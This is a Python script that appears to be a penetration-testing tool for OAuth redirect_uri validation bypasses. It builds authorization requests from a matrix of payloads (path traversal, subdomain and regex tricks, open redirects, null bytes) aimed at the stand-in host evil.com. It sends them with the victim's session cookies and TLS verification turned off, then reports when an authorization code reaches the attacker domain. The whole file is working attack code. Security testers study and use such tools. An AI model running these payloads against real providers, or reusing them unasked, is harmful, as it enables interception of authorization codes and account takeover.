#!/usr/bin/env python3
"""OAuth Redirect URI Matrix -- test redirect_uri validation bypasses."""
import argparse, base64, json, os, sys, time, urllib.parse
from collections import defaultdict

REDIRECT_PAYLOADS = {
    "path_traversal": [
        "https://evil.com/%2F..%2F..%2F{client_id}",
        "https://evil.com/..;/../{client_id}",
        "https://evil.com/;/../{client_id}",
        "https://evil.com//../{client_id}",
    ],
    "subdomain_injection": [
        "https://evil.com.evil.com",
        "https://evil.com.{domain}",
        "https://{client_id}.evil.com",
        "https://evil.com%23@{domain}",
    ],
    "open_redirect": [
        "https://{domain}/oauth/callback?redirect=https://evil.com",
        "https://{domain}/oauth/callback%3Fredirect%3Dhttps://evil.com",
        "https://evil.com%3F{auth_params}",
        "https://{domain}/oauth//evil.com",
    ],
    "regex_bypass": [
        "https://{domain}.evil.com",
        "https://{domain}@evil.com",
        "https://{domain}%40evil.com",
        "https://{domain}.evil.com%2f",
        "https://evil.com/{domain}",
        "https://evil.com%23{domain}",
    ],
    "null_terminator": [
        "https://{domain}%00.evil.com",
        "https://{domain}%00evil.com",
        "https://{domain}%0d.evil.com",
        "https://{domain}%0a.evil.com",
    ],
}

def build_authorization_url(base_url, client_id, redirect_uri, response_type="code", state=None, scope=None):
    params = {
        "response_type": response_type,
        "client_id": client_id,
        "redirect_uri": redirect_uri,
    }
    if state:
        params["state"] = state
    if scope:
        params["scope"] = scope
    return f"{base_url}?{urllib.parse.urlencode(params)}"

def test_redirect_bypass(base_url, client_id, redirect_uri, domain, cookies, headers, proxy, timeout, dry_run):
    crafted_uri = redirect_uri.format(client_id=client_id, domain=domain,
                                       auth_params=urllib.parse.urlencode({"client_id": client_id, "response_type": "code", "redirect_uri": "https://evil.com"}))

    auth_url = build_authorization_url(base_url, client_id, crafted_uri,
                                        state=base64.urlsafe_b64encode(os.urandom(16)).decode().rstrip("="),
                                        scope="openid profile email")
    entry = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "category": "oauth_redirect_bypass",
        "url": auth_url,
        "redirect_uri": crafted_uri,
        "technique": "redirect_uri_manipulation",
    }
    if dry_run:
        entry["status"] = "dry_run"
        entry["response_status"] = None
        entry["response_url"] = None
        entry["bypassed"] = False
        entry["evidence"] = "dry-run: no request sent"
        return entry

    try:
        import urllib.request
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(auth_url, method="GET")
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        if cookies:
            req.add_header("Cookie", "; ".join(f"{k}={v}" for k, v in cookies.items()))

        opener = urllib.request.build_opener()
        if proxy:
            proxy_handler = urllib.request.ProxyHandler({"https": proxy, "http": proxy})
            opener = urllib.request.build_opener(proxy_handler)

        resp = opener.open(req, timeout=timeout)
        final_url = resp.geturl()
        status_code = resp.getcode()
        body = resp.read().decode(errors="replace")[:4096]

        final_parsed = urllib.parse.urlparse(final_url)
        final_domain = final_parsed.netloc.lower().rstrip(":")

        target_parsed = urllib.parse.urlparse(crafted_uri)
        target_domain = target_parsed.netloc.lower().rstrip(":")

        is_bypassed = False
        evidence = ""

        if target_domain in final_domain or final_parsed.path.startswith("/" + target_domain):
            is_bypassed = True
            evidence = f"Redirected to attacker-controlled domain: {final_url}"
        elif "code=" in final_url and urllib.parse.parse_qs(final_parsed.query).get("code"):
            code = urllib.parse.parse_qs(final_parsed.query)["code"][0]
            entry["authorization_code"] = code[:20] + "..."
            is_bypassed = True
            evidence = f"Authorization code returned to malicious redirect_uri: {final_url}"

        entry["status"] = "completed"
        entry["response_status"] = status_code
        entry["response_url"] = final_url
        entry["bypassed"] = is_bypassed
        entry["evidence"] = evidence

    except urllib.error.HTTPError as e:
        entry["status"] = "failed"
        entry["response_status"] = e.code
        entry["response_url"] = None
        entry["bypassed"] = False
        entry["evidence"] = f"HTTP error: {e.code} {e.reason}"
    except Exception as e:
        entry["status"] = "error"
        entry["response_status"] = None
        entry["response_url"] = None
        entry["bypassed"] = False
        entry["evidence"] = f"Request error: {str(e)}"

    return entry

def main():
    parser = argparse.ArgumentParser(description="OAuth Redirect URI Validation Matrix")
    parser.add_argument("--base-url", required=True, help="OAuth authorization endpoint (e.g. https://idp.example.com/oauth/authorize)")
    parser.add_argument("--client-id", required=True, help="OAuth client_id")
    parser.add_argument("--redirect-uri", required=True, help="Original/valid redirect_uri (used to extract domain)")
    parser.add_argument("--domain", help="Target domain (auto-extracted from --redirect-uri if not provided)")
    parser.add_argument("--cookie", default="", help="Session cookies (key=value; key2=value2)")
    parser.add_argument("--header", action="append", default=[], help="Extra headers (Name:Value), repeatable")
    parser.add_argument("--proxy", default="", help="Proxy URL (http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds")
    parser.add_argument("--categories", default="path_traversal,subdomain_injection,open_redirect,regex_bypass,null_terminator",
                        help="Comma-separated attack categories")
    parser.add_argument("--context", default="", help="Target context / scope description")
    parser.add_argument("--dry-run", action="store_true", help="Print planned tests without sending requests")
    parser.add_argument("--output", default="oauth_redirect_findings.jsonl", help="JSONL output file")
    args = parser.parse_args()

    cookies = {}
    if args.cookie:
        for pair in args.cookie.split(";"):
            pair = pair.strip()
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()

    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    if not args.domain:
        parsed = urllib.parse.urlparse(args.redirect_uri)
        args.domain = parsed.netloc.split(":")[0]

    categories = [c.strip() for c in args.categories.split(",") if c.strip() in REDIRECT_PAYLOADS]
    total_tests = sum(len(REDIRECT_PAYLOADS[c]) for c in categories)

    print(f"[*] OAuth Redirect URI Matrix", file=sys.stderr)
    print(f"[*] Target: {args.base_url}", file=sys.stderr)
    print(f"[*] Client ID: {args.client_id}", file=sys.stderr)
    print(f"[*] Domain: {args.domain}", file=sys.stderr)
    print(f"[*] Categories: {categories}", file=sys.stderr)
    print(f"[*] Total payloads: {total_tests}", file=sys.stderr)
    if args.context:
        print(f"[*] Context: {args.context}", file=sys.stderr)
    if args.dry_run:
        print(f"[*] DRY RUN -- no requests will be sent", file=sys.stderr)
    print(f"[*] Output: {args.output}", file=sys.stderr)

    findings = []
    summary = defaultdict(lambda: {"total": 0, "bypassed": 0})

    with open(args.output, "w") as outfile:
        count = 0
        for category in categories:
            print(f"\n[*] Testing category: {category}", file=sys.stderr)
            for redirect_uri_template in REDIRECT_PAYLOADS[category]:
                count += 1
                print(f"    [{count}/{total_tests}] {redirect_uri_template[:80]}", file=sys.stderr)
                entry = test_redirect_bypass(
                    args.base_url, args.client_id, redirect_uri_template,
                    args.domain, cookies, headers, args.proxy, args.timeout, args.dry_run
                )
                entry["category"] = category
                entry["payload"] = redirect_uri_template
                summary[category]["total"] += 1
                if entry.get("bypassed"):
                    summary[category]["bypassed"] += 1

                findings.append(entry)
                outfile.write(json.dumps(entry) + "\n")
                outfile.flush()

    print(f"\n[*] === RESULTS ===", file=sys.stderr)
    for cat, stats in sorted(summary.items()):
        status = "VULNERABLE" if stats["bypassed"] > 0 else "OK"
        print(f"    {cat:25s}: {stats['bypassed']}/{stats['total']} bypassed  [{status}]", file=sys.stderr)

    total_bypassed = sum(s["bypassed"] for s in summary.values())
    print(f"\n[*] {total_bypassed}/{total_tests} total payloads bypassed redirect_uri validation", file=sys.stderr)
    print(f"[*] Findings written to {args.output}", file=sys.stderr)

    sys.exit(1 if total_bypassed > 0 else 0)

if __name__ == "__main__":
    main()